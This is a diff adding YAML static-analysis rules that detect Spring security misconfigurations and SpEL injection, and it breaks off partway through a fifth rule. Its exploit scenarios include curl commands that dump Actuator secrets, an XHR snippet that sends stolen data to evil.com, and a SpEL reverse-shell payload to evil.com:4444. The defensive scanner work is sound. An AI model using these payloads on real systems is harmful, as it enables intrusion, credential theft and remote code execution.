@@ -1,0 +1,1096 @@
+rules:
+  # ============================================================
+  # SPRING FRAMEWORK RULES (FW-SPRING-001 to FW-SPRING-006)
+  # ============================================================
+
+  - rule_id: "FW-SPRING-001"
+    title: "Spring Security permitAll Misconfiguration"
+    description: >
+      Detects Spring Security configurations that use permitAll() on sensitive
+      endpoints or overly broad URL patterns, effectively disabling
+      authentication for routes that should require it. This is a common
+      misconfiguration where developers permit access too broadly during
+      development and fail to restrict it before production deployment.
+    language: java
+    category: framework_misuse
+    severity: Critical
+    confidence: 0.90
+    cwe: CWE-306
+    owasp: "A07:2021-Identification and Authentication Failures"
+    tags:
+      - spring
+      - spring-security
+      - authentication
+      - authorization
+      - misconfiguration
+      - java
+    detection_layer: 4
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: '\.authorizeRequests\s*\(\s*\)\s*\.antMatchers\s*\(\s*"\/\*\*"\s*\)\s*\.permitAll'
+        description: "permitAll on wildcard path matching all endpoints"
+      - type: regex
+        pattern: '\.authorizeHttpRequests\s*\([^)]*\)\s*\.requestMatchers\s*\(\s*"\/\*\*"\s*\)\s*\.permitAll'
+        description: "Spring 6+ permitAll on wildcard requestMatcher"
+      - type: regex
+        pattern: '\.antMatchers\s*\(\s*"\/api\/\*\*"\s*\)\s*\.permitAll'
+        description: "permitAll on entire API path"
+      - type: regex
+        pattern: '\.antMatchers\s*\(\s*"\/admin\/\*\*"\s*\)\s*\.permitAll'
+        description: "permitAll on admin paths"
+      - type: regex
+        pattern: '\.authorizeRequests\s*\(\s*\)\s*\.anyRequest\s*\(\s*\)\s*\.permitAll'
+        description: "permitAll on anyRequest - disables auth entirely"
+      - type: regex
+        pattern: 'http\.csrf\s*\(\s*\)\s*\.disable\s*\(\s*\)[\s\S]*?\.authorizeRequests'
+        description: "CSRF disabled combined with permissive auth config"
+      - type: regex
+        pattern: 'web\.ignoring\s*\(\s*\)\s*\.antMatchers\s*\(\s*"\/api'
+        description: "WebSecurity ignoring API paths entirely"
+      - type: regex
+        pattern: '\.requestMatchers\s*\(\s*"\/users\/\*\*"\s*\)\s*\.permitAll'
+        description: "permitAll on user management endpoints"
+    anti_patterns:
+      - '\.authenticated\s*\(\s*\)'
+      - '\.hasRole\s*\('
+      - '\.hasAuthority\s*\('
+      - '\.hasAnyRole\s*\('
+      - '\.denyAll\s*\(\s*\)'
+      - '\.antMatchers\s*\(\s*"\/api\/public\/'
+      - '\.antMatchers\s*\(\s*"\/health"\s*\)\s*\.permitAll'
+      - '\.antMatchers\s*\(\s*"\/login"\s*\)\s*\.permitAll'
+      - '\.antMatchers\s*\(\s*"\/register"\s*\)\s*\.permitAll'
+      - '\.antMatchers\s*\(\s*"\/actuator\/health"\s*\)\s*\.permitAll'
+      - '\.anyRequest\s*\(\s*\)\s*\.authenticated\s*\(\s*\)'
+      - '\.anyRequest\s*\(\s*\)\s*\.denyAll\s*\(\s*\)'
+      - '@PreAuthorize'
+      - '@Secured'
+      - '@RolesAllowed'
+    bypass_variants:
+      - description: "permitAll on specific paths but anyRequest fallback missing"
+        pattern: '\.antMatchers\s*\([^)]+\)\s*\.authenticated[\s\S]*?(?!anyRequest)'
+      - description: "Method-level security overridden by URL-level permitAll"
+        pattern: '\.antMatchers\s*\(\s*HttpMethod\.\w+\s*,\s*"[^"]*"\s*\)\s*\.permitAll[\s\S]*?@PreAuthorize'
+      - description: "Spring profiles enabling permitAll in non-dev profiles"
+        pattern: '@Profile\s*\(\s*"!dev"\s*\)[\s\S]*?permitAll'
+    evasion_indicators:
+      - "Security configuration split across multiple SecurityFilterChain beans"
+      - "Custom AuthenticationFilter that always returns success"
+      - "Order annotation causing permissive filter to take precedence"
+    encoding_variants:
+      - type: "lambda_dsl"
+        pattern: 'authorize\s*->\s*authorize\s*\.\s*anyRequest\s*\(\s*\)\s*\.\s*permitAll'
+      - type: "string_variable"
+        pattern: 'String\s+\w+\s*=\s*"\/\*\*";\s*\.antMatchers\s*\(\s*\w+\s*\)\s*\.permitAll'
+    multi_function_chain_patterns:
+      - "HttpSecurity -> authorizeRequests() -> antMatchers('/**') -> permitAll() -> all endpoints open"
+      - "HttpSecurity -> csrf().disable() -> authorizeRequests() -> anyRequest().permitAll() -> no security"
+      - "WebSecurity -> ignoring() -> antMatchers('/api/**') -> security filter bypass"
+    privilege_context_flags:
+      requires_auth_context: true
+      admin_only_risk: true
+      escalation_vector: "permitAll on sensitive endpoints enables unauthenticated access to admin functions"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "Unauthenticated HTTP request"
+        sink: "Controller method handling sensitive operation"
+        through: "Spring Security filter chain with permitAll"
+    impact: |
+      Using permitAll() on sensitive URL patterns disables Spring Security's
+      authentication and authorization for those endpoints. Attackers can
+      access admin panels, user management APIs, data endpoints, and
+      privileged operations without any credentials. Combined with disabled
+      CSRF, this allows full exploitation of all protected functionality.
+    remediation: |
+      Configure Spring Security with explicit path-based authorization:
+
+      ```java
+      @Configuration
+      @EnableWebSecurity
+      public class SecurityConfig {
+
+          @Bean
+          public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
+              http
+                  .authorizeHttpRequests(authorize -> authorize
+                      .requestMatchers("/public/**", "/login", "/register").permitAll()
+                      .requestMatchers("/admin/**").hasRole("ADMIN")
+                      .requestMatchers("/api/**").authenticated()
+                      .anyRequest().denyAll()
+                  )
+                  .csrf(csrf -> csrf
+                      .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
+                  );
+              return http.build();
+          }
+      }
+      ```
+    references:
+      - "https://docs.spring.io/spring-security/reference/servlet/authorization/authorize-http-requests.html"
+      - "https://cwe.mitre.org/data/definitions/306.html"
+      - "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"
+      - "https://spring.io/guides/topicals/spring-security-architecture/"
+    context_awareness:
+      surrounding_context_patterns:
+        - '@EnableWebSecurity'
+        - 'extends\s+WebSecurityConfigurerAdapter'
+        - 'SecurityFilterChain'
+        - 'HttpSecurity'
+      taint_source_indicators:
+        - '@RequestParam'
+        - '@PathVariable'
+        - '@RequestBody'
+      taint_sink_indicators:
+        - '\.permitAll\s*\(\s*\)'
+        - '\.ignoring\s*\(\s*\)'
+      sanitization_patterns:
+        - '\.authenticated\s*\(\s*\)'
+        - '\.hasRole\s*\('
+        - '\.hasAuthority\s*\('
+    severity_scoring:
+      severity_weight: 9
+      risk_score_formula_hint: "severity_weight * confidence * (admin_paths_exposed ? 1.5 : 1.0)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Spring Boot application configures authorizeRequests().anyRequest()
+        .permitAll() during development. The configuration is deployed to
+        production without change. An attacker discovers admin endpoints at
+        /api/admin/users and /api/admin/config. Without authentication
+        required, they enumerate users, elevate privileges, and modify
+        application configuration to enable further exploitation.
+      example_payload: "curl https://target.com/api/admin/users -H 'Accept: application/json'"
+      attacker_objective: "Access sensitive endpoints without authentication due to permitAll misconfiguration"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "medium"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "framework-aware"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "FW-SPRING-002"
+        - "FW-SPRING-005"
+        - "FW-SPRING-006"
+
+  - rule_id: "FW-SPRING-002"
+    title: "Spring Boot Actuator Endpoints Exposed Without Authentication"
+    description: >
+      Detects Spring Boot applications that expose Actuator endpoints (health,
+      env, configprops, heapdump, threaddump, mappings, etc.) without requiring
+      authentication. Actuator endpoints provide deep operational insight into
+      the running application including environment variables, configuration
+      properties, heap dumps containing secrets, and application mappings. In
+      Spring Boot 1.x, all actuator endpoints are exposed by default.
+    language: java
+    category: framework_misuse
+    severity: High
+    confidence: 0.92
+    cwe: CWE-200
+    owasp: "A05:2021-Security Misconfiguration"
+    tags:
+      - spring-boot
+      - actuator
+      - information-disclosure
+      - misconfiguration
+      - secrets-exposure
+      - java
+    detection_layer: 4
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'management\.endpoints\.web\.exposure\.include\s*=\s*\*'
+        description: "All actuator endpoints exposed via wildcard"
+      - type: regex
+        pattern: 'management\.endpoints\.web\.exposure\.include\s*=\s*.*env'
+        description: "Environment actuator endpoint exposed"
+      - type: regex
+        pattern: 'management\.endpoints\.web\.exposure\.include\s*=\s*.*heapdump'
+        description: "Heapdump actuator endpoint exposed"
+      - type: regex
+        pattern: 'management\.endpoints\.web\.exposure\.include\s*=\s*.*configprops'
+        description: "Config properties actuator endpoint exposed"
+      - type: regex
+        pattern: 'management\.security\.enabled\s*=\s*false'
+        description: "Actuator security explicitly disabled (Spring Boot 1.x)"
+      - type: regex
+        pattern: '\.antMatchers\s*\(\s*"\/actuator\/\*\*"\s*\)\s*\.permitAll'
+        description: "Actuator paths permitted without authentication"
+      - type: regex
+        pattern: 'management\.endpoint\.env\.enabled\s*=\s*true'
+        description: "Environment endpoint explicitly enabled"
+      - type: regex
+        pattern: 'management\.endpoint\.shutdown\.enabled\s*=\s*true'
+        description: "Shutdown endpoint enabled (allows remote shutdown)"
+    anti_patterns:
+      - 'management\.endpoints\.web\.exposure\.include\s*=\s*health\s*$'
+      - 'management\.endpoints\.web\.exposure\.include\s*=\s*health,info\s*$'
+      - '\.antMatchers\s*\(\s*"\/actuator\/\*\*"\s*\)\s*\.hasRole'
+      - '\.antMatchers\s*\(\s*"\/actuator\/\*\*"\s*\)\s*\.authenticated'
+      - 'management\.server\.port\s*='
+      - 'management\.endpoints\.web\.exposure\.exclude\s*=\s*\*'
+      - 'management\.endpoint\.env\.enabled\s*=\s*false'
+      - 'management\.endpoints\.enabled-by-default\s*=\s*false'
+      - 'management\.server\.address\s*=\s*127\.0\.0\.1'
+      - 'management\.endpoints\.web\.exposure\.include\s*=\s*health,info,prometheus'
+      - '@ConditionalOnProperty.*actuator'
+      - 'management\.endpoint\.heapdump\.enabled\s*=\s*false'
+      - 'management\.server\.ssl\.enabled\s*=\s*true'
+      - 'EndpointRequest\.toAnyEndpoint\(\)\.authenticated'
+      - 'spring\.security\.user\.name'
+    bypass_variants:
+      - description: "Actuator on separate management port but without network restriction"
+        pattern: 'management\.server\.port\s*=\s*\d+(?![\s\S]*management\.server\.address)'
+      - description: "Actuator secured but jolokia endpoint bypasses auth"
+        pattern: 'management\.endpoints\.web\.exposure\.include\s*=\s*.*jolokia'
+      - description: "Custom actuator endpoint without security annotation"
+        pattern: '@Endpoint\s*\(\s*id\s*=\s*"[^"]+"\s*\)[\s\S]*?@ReadOperation(?![\s\S]*@Secured)'
+    evasion_indicators:
+      - "Actuator exposed on a different context path"
+      - "Custom management port without firewall rules"
+      - "Actuator endpoints proxied through API gateway without auth"
+    encoding_variants:
+      - type: "yaml_config"
+        pattern: 'exposure:\s*\n\s*include:\s*["\x27]?\*["\x27]?'
+      - type: "env_override"
+        pattern: 'MANAGEMENT_ENDPOINTS_WEB_EXPOSURE_INCLUDE\s*=\s*\*'
+    multi_function_chain_patterns:
+      - "management.endpoints.web.exposure.include=* -> /actuator/env -> credentials revealed"
+      - "management.endpoints.web.exposure.include=* -> /actuator/heapdump -> secrets in memory"
+      - "management.endpoints.web.exposure.include=* -> /actuator/mappings -> all routes discovered"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: true
+      escalation_vector: "Actuator endpoints reveal secrets and enable RCE via heapdump analysis or env modification"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "Unauthenticated HTTP request to /actuator/*"
+        sink: "Environment variables, heap memory, configuration properties"
+        through: "Spring Boot Actuator endpoints"
+    impact: |
+      Exposed actuator endpoints can reveal database credentials, API keys,
+      cloud provider secrets, and internal configuration. The /actuator/env
+      endpoint shows all environment variables. The /actuator/heapdump allows
+      downloading a JVM heap dump containing in-memory secrets, session data,
+      and encryption keys. The /actuator/shutdown endpoint enables remote
+      application shutdown (DoS). The /actuator/gateway/routes can reveal
+      internal service topology.
+    remediation: |
+      Restrict actuator endpoint exposure and require authentication:
+
+      ```yaml
+      # application.yml
+      management:
+        endpoints:
+          web:
+            exposure:
+              include: health,info,prometheus
+          enabled-by-default: false
+        endpoint:
+          health:
+            enabled: true
+            show-details: when-authorized
+          info:
+            enabled: true
+        server:
+          port: 9090  # Separate management port
+          address: 127.0.0.1  # Only localhost
+      ```
+
+      ```java
+      // Secure actuator endpoints
+      http.requestMatcher(EndpointRequest.toAnyEndpoint())
+          .authorizeRequests()
+          .anyRequest().hasRole("ACTUATOR_ADMIN");
+      ```
+    references:
+      - "https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html"
+      - "https://cwe.mitre.org/data/definitions/200.html"
+      - "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"
+      - "https://www.veracode.com/blog/research/exploiting-spring-boot-actuators"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'management\.endpoints'
+        - 'actuator'
+        - 'spring-boot-starter-actuator'
+        - '@SpringBootApplication'
+      taint_source_indicators:
+        - '/actuator/'
+        - 'management\.endpoints'
+      taint_sink_indicators:
+        - 'health\s*,'
+        - 'env\s*,'
+        - 'heapdump'
+        - 'configprops'
+      sanitization_patterns:
+        - 'EndpointRequest.*authenticated'
+        - 'management\.server\.address\s*=\s*127'
+        - 'hasRole.*ACTUATOR'
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (heapdump_exposed ? 1.5 : 1.0)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        An attacker scans a Spring Boot application and discovers /actuator
+        endpoints. They access /actuator/env to find database credentials
+        and AWS keys. They download /actuator/heapdump and use Eclipse MAT
+        to extract session tokens and encryption keys from heap memory.
+        Using the database credentials, they access the production database.
+        Using the session tokens, they impersonate admin users.
+      example_payload: "curl https://target.com/actuator/env && curl https://target.com/actuator/heapdump -o heap.hprof"
+      attacker_objective: "Extract secrets, credentials, and session data from exposed actuator endpoints"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "low"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "framework-aware"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "FW-SPRING-001"
+        - "FW-SPRING-003"
+
+  - rule_id: "FW-SPRING-003"
+    title: "Spring CORS Wide-Open Configuration"
+    description: >
+      Detects Spring applications that configure CORS with overly permissive
+      settings, such as allowing all origins, all methods, or all headers.
+      This includes @CrossOrigin annotations without restrictions, global
+      CorsRegistry configuration with wildcards, and CorsConfiguration bean
+      definitions that permit any origin. Wide-open CORS enables cross-origin
+      attacks on authenticated endpoints.
+    language: java
+    category: framework_misuse
+    severity: High
+    confidence: 0.88
+    cwe: CWE-942
+    owasp: "A05:2021-Security Misconfiguration"
+    tags:
+      - spring
+      - cors
+      - cross-origin
+      - misconfiguration
+      - api-security
+      - java
+    detection_layer: 4
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: '@CrossOrigin\s*\(\s*origins\s*=\s*"\*"'
+        description: "CrossOrigin annotation with wildcard origin"
+      - type: regex
+        pattern: '@CrossOrigin\s*$'
+        description: "CrossOrigin annotation without any restrictions"
+      - type: regex
+        pattern: '@CrossOrigin\s*\(\s*\)'
+        description: "CrossOrigin with default permissive config"
+      - type: regex
+        pattern: 'addAllowedOrigin\s*\(\s*"\*"\s*\)'
+        description: "CorsConfiguration allowing all origins"
+      - type: regex
+        pattern: 'addAllowedOriginPattern\s*\(\s*"\*"\s*\)'
+        description: "CorsConfiguration with wildcard origin pattern"
+      - type: regex
+        pattern: 'allowedOrigins\s*\(\s*"\*"\s*\)'
+        description: "CorsRegistry with wildcard origins"
+      - type: regex
+        pattern: 'setAllowedOrigins\s*\(\s*Arrays\.asList\s*\(\s*"\*"\s*\)\s*\)'
+        description: "setAllowedOrigins with wildcard list"
+      - type: regex
+        pattern: 'allowCredentials\s*\(\s*true\s*\)[\s\S]{0,100}allowedOrigins\s*\(\s*"\*"'
+        description: "Credentials true with wildcard origins"
+    anti_patterns:
+      - 'addAllowedOrigin\s*\(\s*"https?://[\w.-]+"\s*\)'
+      - 'allowedOrigins\s*\(\s*"https?://[\w.-]+"\s*\)'
+      - '@CrossOrigin\s*\(\s*origins\s*=\s*"https?://'
+      - 'setAllowedOrigins\s*\(\s*Arrays\.asList\s*\(\s*"https?://'
+      - 'allowedOrigins\s*\(\s*\$\{'
+      - 'CorsConfigurationSource'
+      - 'origins\s*=\s*\{\s*"https?://'
+      - '@Value.*cors\.origins'
+      - 'corsProperties'
+      - 'cors\.allowed-origins\s*=\s*https?://'
+      - 'addAllowedOrigin\s*\(\s*origin\s*\)[\s\S]*?if\s*\(\s*allowedOrigins'
+      - 'CorsFilter\s*\([^)]*corsConfigurationSource'
+      - 'origins\s*=\s*\{\s*["\x27]https://'
+      - 'allowedOriginPatterns\s*\(\s*"https'
+      - 'addMapping.*allowedOrigins\s*\(\s*"https'
+    bypass_variants:
+      - description: "CORS restricted globally but controller-level @CrossOrigin overrides"
+        pattern: '@CrossOrigin\s*\(\s*origins\s*=\s*"\*"\s*\)[\s\S]*?@(Get|Post|Put|Delete)Mapping'
+      - description: "Origin pattern matching allowing subdomain takeover"
+        pattern: 'addAllowedOriginPattern\s*\(\s*"https?://\*\.example\.com"\s*\)'
+      - description: "CorsFilter registered with permissive config overriding Spring Security"
+        pattern: '@Bean[\s\S]*?CorsFilter[\s\S]*?addAllowedOrigin\s*\(\s*"\*"\s*\)'
+    evasion_indicators:
+      - "CORS configuration in separate @Configuration class"
+      - "Spring Security CORS configuration conflicting with MVC CORS"
+      - "CORS configured at API gateway level with different policy than app"
+    encoding_variants:
+      - type: "property_placeholder"
+        pattern: 'allowedOrigins\s*\(\s*"\$\{cors\.origins:\*\}"\s*\)'
+      - type: "array_spread"
+        pattern: 'origins\s*=\s*\{[^}]*"\*"[^}]*\}'
+    multi_function_chain_patterns:
+      - "@CrossOrigin(*) -> @GetMapping(/api/user) -> user data accessible cross-origin"
+      - "CorsConfiguration -> addAllowedOrigin(*) -> allowCredentials(true) -> session theft"
+      - "WebMvcConfigurer -> addCorsMappings -> allowedOrigins(*) -> global CORS bypass"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Cross-origin access to authenticated endpoints enables data theft"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "Cross-origin request from attacker's domain"
+        sink: "Authenticated Spring controller endpoint"
+        through: "Permissive CORS configuration"
+    impact: |
+      Wide-open CORS configuration allows any website to make cross-origin
+      requests to the Spring application. When combined with credentials
+      (cookies, authorization headers), attackers can read authenticated
+      responses, steal data, and perform actions on behalf of users from
+      any origin. This effectively bypasses same-origin policy protections.
+    remediation: |
+      Configure CORS with explicit origin whitelist:
+
+      ```java
+      @Configuration
+      public class CorsConfig implements WebMvcConfigurer {
+
+          @Value("${cors.allowed-origins}")
+          private String[] allowedOrigins;
+
+          @Override
+          public void addCorsMappings(CorsRegistry registry) {
+              registry.addMapping("/api/**")
+                  .allowedOrigins(allowedOrigins)
+                  .allowedMethods("GET", "POST", "PUT", "DELETE")
+                  .allowedHeaders("Content-Type", "Authorization")
+                  .allowCredentials(true)
+                  .maxAge(3600);
+          }
+      }
+      ```
+    references:
+      - "https://docs.spring.io/spring-framework/reference/web/webmvc-cors.html"
+      - "https://cwe.mitre.org/data/definitions/942.html"
+      - "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"
+      - "https://spring.io/blog/2015/06/08/cors-support-in-spring-framework"
+    context_awareness:
+      surrounding_context_patterns:
+        - '@CrossOrigin'
+        - 'CorsConfiguration'
+        - 'CorsRegistry'
+        - 'WebMvcConfigurer'
+      taint_source_indicators:
+        - 'Origin\s*header'
+        - '@CrossOrigin'
+      taint_sink_indicators:
+        - 'addAllowedOrigin'
+        - 'allowedOrigins'
+        - 'setAllowedOrigins'
+      sanitization_patterns:
+        - 'allowedOrigins\s*\(\s*"https://'
+        - 'addAllowedOrigin\s*\(\s*"https://'
+    severity_scoring:
+      severity_weight: 7
+      risk_score_formula_hint: "severity_weight * confidence * (credentials_allowed ? 1.5 : 1.0)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Spring Boot REST API uses @CrossOrigin on its controllers without
+        specifying origins. An attacker creates a malicious webpage that uses
+        XMLHttpRequest to send authenticated requests to the API. The browser
+        includes the victim's session cookie, and the permissive CORS
+        configuration allows the attacker's page to read the response
+        containing sensitive user data and API responses.
+      example_payload: "var xhr=new XMLHttpRequest();xhr.open('GET','https://api.target.com/api/users/me',true);xhr.withCredentials=true;xhr.onload=function(){fetch('https://evil.com/steal',{method:'POST',body:xhr.responseText})};xhr.send();"
+      attacker_objective: "Steal authenticated API responses via cross-origin requests"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "medium"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "framework-aware"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "FW-SPRING-001"
+        - "FW-EXPRESS-002"
+        - "FW-ASPNET-005"
+
+  - rule_id: "FW-SPRING-004"
+    title: "SpEL Injection via @Value or Expression Evaluation"
+    description: >
+      Detects Spring applications that use Spring Expression Language (SpEL)
+      with user-controlled input in @Value annotations, SpelExpressionParser,
+      or other expression evaluation contexts. SpEL injection allows remote
+      code execution by evaluating arbitrary expressions that can access Java
+      runtime, execute system commands, and read/write files.
+    language: java
+    category: framework_misuse
+    severity: Critical
+    confidence: 0.91
+    cwe: CWE-917
+    owasp: "A03:2021-Injection"
+    tags:
+      - spring
+      - spel
+      - expression-injection
+      - rce
+      - injection
+      - java
+    detection_layer: 4
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'SpelExpressionParser\s*\(\s*\)[\s\S]*?parseExpression\s*\(\s*\w+'
+        description: "SpEL parser evaluating dynamic expression"
+      - type: regex
+        pattern: 'parser\.parseExpression\s*\(\s*request\.'
+        description: "SpEL parsing user request input directly"
+      - type: regex
+        pattern: 'ExpressionParser[\s\S]*?parseExpression\s*\(\s*\w+\s*\)[\s\S]*?getValue'
+        description: "Expression parsed and evaluated with getValue"
+      - type: regex
+        pattern: '@Value\s*\(\s*"#\{[^}]*\$\{'
+        description: "@Value annotation mixing SpEL with property placeholder"
+      - type: regex
+        pattern: 'new\s+SpelExpressionParser\s*\(\s*\)\.parseExpression\s*\('
+        description: "Inline SpEL parser with immediate evaluation"
+      - type: regex
+        pattern: 'StandardEvaluationContext\s*\(\s*\)[\s\S]*?setValue'
+        description: "SpEL evaluation context with setValue operation"
+      - type: regex
+        pattern: 'expressionParser\.parseExpression\s*\(\s*[^")\x27]'
+        description: "Expression parser with non-literal argument"
+      - type: regex
+        pattern: '@PreAuthorize\s*\(\s*"[^"]*\+[^"]*"'
+        description: "@PreAuthorize with string concatenation in expression"
+    anti_patterns:
+      - 'SimpleEvaluationContext'
+      - 'parseExpression\s*\(\s*"[^"]*"\s*\)'
+      - 'StandardEvaluationContext.*setTypeLocator.*null'
+      - 'SimpleEvaluationContext\.forReadOnlyDataBinding'
+      - '@Value\s*\(\s*"\$\{[^#]*\}"\s*\)'
+      - 'LiteralExpression'
+      - 'CompositeStringExpression'
+      - 'validator\.validate'
+      - 'Pattern\.matches\s*\('
+      - 'allowedExpressions'
+      - 'expressionWhitelist'
+      - 'SimpleEvaluationContext\.forPropertyAccessors'
+      - 'parseExpression\s*\(\s*"[a-zA-Z]+"\s*\)'
+      - '@Value\s*\(\s*"\$\{'
+      - 'BeanExpressionResolver'
+    bypass_variants:
+      - description: "SpEL injection via Spring Data dynamic query"
+        pattern: '@Query\s*\([^)]*#\{[^}]*\$\{'
+      - description: "Expression from message resource bundle"
+        pattern: 'messageSource\.getMessage[\s\S]*?SpelExpressionParser'
+      - description: "SpEL in error message template"
+        pattern: 'ConstraintValidatorContext[\s\S]*?buildConstraintViolationWithTemplate\s*\(\s*\w+'
+    evasion_indicators:
+      - "SpEL expression constructed through string operations across methods"
+      - "Expression input from database field populated by user"
+      - "SpEL used in Spring Batch job parameters"
+    encoding_variants:
+      - type: "unicode_escape"
+        pattern: 'parseExpression\s*\(\s*.*\\u'
+      - type: "reflection_bypass"
+        pattern: 'T\s*\(\s*java\.lang\.Runtime\s*\)\.getRuntime\s*\(\s*\)\.exec'
+    multi_function_chain_patterns:
+      - "request.getParameter() -> SpelExpressionParser.parseExpression(input) -> getValue() -> RCE"
+      - "@RequestParam -> service.evaluate(expr) -> ExpressionParser.parseExpression -> RCE"
+      - "database.getField('expression') -> SpelExpressionParser -> getValue() -> stored expression injection"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "SpEL injection enables arbitrary code execution on the server"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "User input (@RequestParam, @PathVariable, @RequestBody)"
+        sink: "SpelExpressionParser.parseExpression().getValue()"
+        through: "Controller -> Service -> Expression evaluation"
+    impact: |
+      SpEL injection allows attackers to execute arbitrary Java code on the
+      server. Through SpEL, attackers can invoke Runtime.exec() to run system
+      commands, access the Java ClassLoader to load arbitrary classes, read
+      and write files, access Spring beans and application context, and
+      exfiltrate environment variables and secrets. This typically results
+      in complete server compromise.
+    remediation: |
+      Use SimpleEvaluationContext instead of StandardEvaluationContext:
+
+      ```java
+      // UNSAFE - allows arbitrary type access
+      // ExpressionParser parser = new SpelExpressionParser();
+      // parser.parseExpression(userInput).getValue();
+
+      // SAFE - restricted evaluation context
+      ExpressionParser parser = new SpelExpressionParser();
+      EvaluationContext context = SimpleEvaluationContext
+          .forReadOnlyDataBinding()
+          .build();
+      // Only evaluate trusted, predefined expressions
+      Expression expr = parser.parseExpression("propertyName");
+      Object value = expr.getValue(context, targetObject);
+
+      // Better: avoid SpEL with user input entirely
+      // Use parameterized queries, switch statements, or enums
+      ```
+    references:
+      - "https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#expressions"
+      - "https://cwe.mitre.org/data/definitions/917.html"
+      - "https://owasp.org/Top10/A03_2021-Injection/"
+      - "https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'SpelExpressionParser'
+        - 'ExpressionParser'
+        - 'StandardEvaluationContext'
+        - 'parseExpression'
+      taint_source_indicators:
+        - '@RequestParam'
+        - '@PathVariable'
+        - '@RequestBody'
+        - 'request\.getParameter'
+      taint_sink_indicators:
+        - 'parseExpression\s*\('
+        - 'getValue\s*\('
+        - 'setValue\s*\('
+      sanitization_patterns:
+        - 'SimpleEvaluationContext'
+        - 'forReadOnlyDataBinding'
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (user_input_in_expr ? 1.5 : 1.0)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Spring controller accepts a 'filter' parameter and uses it in a
+        SpEL expression: parser.parseExpression(filter).getValue(context).
+        An attacker sends: filter=T(java.lang.Runtime).getRuntime().exec('id')
+        The SpEL engine evaluates this expression, executing the 'id' command
+        on the server. The attacker escalates to a reverse shell for full
+        server access.
+      example_payload: "T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','bash -i >& /dev/tcp/evil.com/4444 0>&1'})"
+      attacker_objective: "Achieve remote code execution through Spring Expression Language injection"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "framework-aware"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "FW-SPRING-001"
+        - "FW-SPRING-005"
+
+  - rule_id: "FW-SPRING-005"
+    title: "Missing Method-Level Security in Spring Controllers"
+    description: >
+      Detects Spring controllers and service methods that perform sensitive
+      operations without method-level security annotations (@PreAuthorize,
+      @Secured, @RolesAllowed). While URL-level security in HttpSecurity
+      provides a first layer of defense, method-level security ensures
+      authorization checks at the business logic layer. Without it, URL
+      pattern changes or misconfigurations can expose privileged operations.
+    language: java
+    category: framework_misuse
+    severity: High
+    confidence: 0.83
+    cwe: CWE-862
+    owasp: "A01:2021-Broken Access Control"
+    tags:
+      - spring
+      - authorization
+      - method-security
+      - access-control
+      - rbac
+      - java
+    detection_layer: 4
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: '@(Delete|Put|Patch)Mapping\s*\([^)]*\)\s*\n\s*public\s+\w+\s+\w+\s*\('
+        description: "State-changing endpoint without security annotation"
+      - type: regex
+        pattern: '@RequestMapping\s*\([^)]*method\s*=\s*RequestMethod\.(DELETE|PUT)\s*[^)]*\)\s*\n\s*public'
+        description: "DELETE/PUT mapping without method security"
+      - type: regex
